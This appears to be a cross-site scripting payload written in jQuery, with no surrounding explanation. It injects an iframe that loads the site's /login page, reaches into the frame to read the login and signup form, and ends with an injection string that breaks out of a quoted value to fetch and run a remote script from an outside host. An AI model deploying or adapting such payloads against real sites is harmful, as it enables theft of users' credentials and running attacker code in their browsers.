$(function  () {
  a = $('#page-error').html("<iframe id='xss' src='/login' width=1000 height=1000 />").show().find('iframe').load(function(){
    console.log($("#loginSignup form", $('#xss')[0].contentDocument))
  });
});

// '+$.getScript('http://ox/javascripts/xss.js')+'